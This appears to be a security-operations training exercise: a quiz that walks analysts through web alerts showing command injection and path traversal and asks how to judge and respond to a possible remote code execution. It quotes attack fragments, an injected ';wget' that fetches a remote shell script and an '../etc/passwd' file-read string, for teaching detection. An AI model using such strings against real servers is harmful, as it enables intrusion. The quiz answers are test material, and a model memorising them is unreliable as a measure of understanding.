title: Web RCE / Command Injection
briefing: A single external source is sending $TARGET web requests that go beyond ordinary probing: command-injection strings and path traversal aimed at running code and reading files, and the server is answering 200. Decide whether this is remote code execution being attempted, whether it may have succeeded, and how urgently to act.
dashboard_hint: Discover -> rule.id: 31106 on agent.name: $TARGET. Read data.url carefully: ';wget http://.../x.sh' is command injection pulling a payload; '../../../../etc/passwd' is file read. A 200 response means the app served it.

questions.explain: One external IP ($SRC1) sent all the RCE / traversal requests.
';wget http://.../x.sh' executes a command that pulls a payload — attempted RCE, not mere scanning.

questions.prompt: Which techniques appear in the requests? (select all)
questions.explain: cmd injection + '../../etc/passwd' traversal + a wget of a remote .sh payload. No SQLi/XSS in this one.

questions.prompt: The alerts show HTTP 200. What should you assume?
options: The server served the malicious requests; treat the host as possibly compromised
The attack was blocked by the WAF
questions.answer: The server served the malicious requests; treat the host as possibly compromised
questions.explain: 200 on an injection request means it was served — assume possible code execution until proven otherwise.
T1190 Exploit Public-Facing Application (command execution via the web app; T1059 Command and Scripting Interpreter also fits).

options: Isolate / snapshot the host for IR
Hunt for the pulled payload + outbound connections to the attacker
Wait and see if more alerts arrive
answer: Isolate / snapshot the host for IR
Hunt for the pulled payload + outbound connections to the attacker
questions.explain: Possible RCE with 200s = treat as compromise: isolate, block, hunt for the payload/C2, virtual-patch. 'Wait and see' loses the host.
